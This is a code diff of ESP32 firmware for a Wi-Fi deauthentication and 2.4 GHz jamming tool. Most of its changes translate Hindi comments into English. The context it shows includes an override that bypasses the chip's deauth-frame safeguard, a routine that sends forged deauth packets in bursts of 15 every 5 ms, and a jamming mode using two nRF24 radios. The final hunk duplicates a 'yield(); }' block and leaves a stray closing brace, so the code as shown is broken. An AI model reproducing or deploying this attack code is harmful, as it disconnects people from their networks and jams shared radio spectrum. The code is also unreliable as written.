@@ -7,7 +7,7 @@
 #include "esp_system.h"
 
 // ================= ESP-IDF BYPASS (CRITICAL) =================
-// Ye function ESP32 ke internal deauth block ko bypass karta hai
+// This function bypasses the ESP32's internal deauth block
 extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
     return 0; 
 }
@@ -35,7 +35,7 @@ String targetSSID = "";
 
 SPIClass *sp = nullptr;
 SPIClass *hp = nullptr;
-RF24 radio(27, 33, 16000000); // CSN pin 15 se 33 kar diya (Safe Pin)
+RF24 radio(27, 33, 16000000); // Changed CSN pin from 15 to 33 (Safe Pin)
 RF24 radio1(22, 21, 16000000);
 
 int ch = 45;
@@ -152,7 +152,7 @@ void sendDeauth() {
   packet[23] = (seqNum >> 8) & 0xFF;
   seqNum++;
 
-  // 🔥 MAXIMUM AGGRESSIVE MODE: 15 packets back-to-back (Pehle 3 tha, ab 15 hai)
+  // 🔥 MAXIMUM AGGRESSIVE MODE: 15 packets back-to-back (Increased from 3 to 15)
   for (int i = 0; i < 15; i++) {
     esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
   }
@@ -270,11 +270,13 @@ void loop() {
 
   if (isJamming) aggressiveRandomMode();
   
-  // 🔥 MAX SPEED DEAUTH: 5ms delay (20ms se bahut tez, par WDT crash se bachata hai)
+  // 🔥 MAX SPEED DEAUTH: 5ms delay (Much faster than 20ms, but prevents WDT crash)
   if (isDeauthing) { 
     sendDeauth(); 
     delay(5); 
   }
   
+  yield(); 
+}
   yield(); 
 }
